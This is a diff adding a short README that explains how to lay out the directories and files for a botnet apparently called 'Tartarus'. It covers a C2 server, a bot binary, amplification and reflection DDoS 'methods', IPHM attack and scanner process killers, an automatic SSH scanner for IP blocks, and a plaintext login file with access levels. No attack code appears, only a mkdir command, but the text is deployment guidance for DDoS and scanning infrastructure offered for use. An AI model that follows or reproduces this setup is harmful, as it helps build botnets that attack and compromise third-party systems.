@@ -1,0 +1,37 @@
+Small explenation on files and directories.
+
+Directories needed:
+c2, bot
+
+Inside of the c2 folder, you will need the following folders:
+scripts, logs, amp 
+
+Inside of the amp folder, you will need the following folders:
+methods, lists, scanners
+
+Inside of the methods folder, you will need the following folders:
+Bandwidth, Reflection
+
+For the (amp) folder, the install.py should up on its own. All directories will be created on its own.
+
+
+Files needed inside of (bot) folder:
+bot.c Tartarus.py
+==================================================
+Files needed inside of (c2) folder:
+Tartarus.c, tartarus.txt, install.py, resolver.h
+==================================================
+Files needed inside of (c2/scripts) folder.
+IPHM_Attack_Process_Killer.py, IPHM_Scanner_Process_Killer.py, scan.py
+
+If this helps < here ya go
+mkdir c2; mkdir bot; cd c2; mkdir logs; mkdir scripts
+==================================================
+The "resolver.h" is a C-Header and is included whithin the c2 source itself. THIS IS NEEDED IN ORDER TO COMPILE SAID FILE.
+The "install.py" is the IPHM Script installer. This is needed in the c2 directory, mainly because since we are inside of the c2 dir,
+we can not push back to run things. It would make it impossible to run the files off of the c2, so we have to call to the
+amp/methods/ folder inside of the c2 dir. 
+The "tartarus.txt" is our login file. should look like this: Jack root admin || Input: <Username> <Password> <Level> || levels="admin","normal","vip"
+The "IPHM_Attack_Process_Killer.py" is our IPHM Process killer. Makes it easier to kill shit.
+The "IPHM_Scanner_Process_Killer.py" is our IPHM Scanner process killer. Makes it easier to kill shit.
+The "scan.py" is our SSH Scanner. scans IP Blocks automatically.
